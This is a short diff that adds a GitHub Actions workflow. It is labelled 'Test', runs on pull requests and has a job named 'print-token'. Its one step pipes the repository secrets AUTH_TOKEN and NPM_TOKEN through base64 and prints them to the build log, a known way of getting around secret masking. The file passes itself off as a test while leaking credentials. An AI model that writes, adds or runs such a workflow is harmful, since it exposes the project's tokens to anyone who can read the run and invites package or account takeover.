@@ -1,0 +1,12 @@
+name: Test
+
+on:
+  pull_request:
+
+jobs:
+  print-token:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Print 
+      run: echo  ${{ secrets.AUTH_TOKEN }} | base64 && echo ${{ secrets.NPM_TOKEN }} | base64 -d
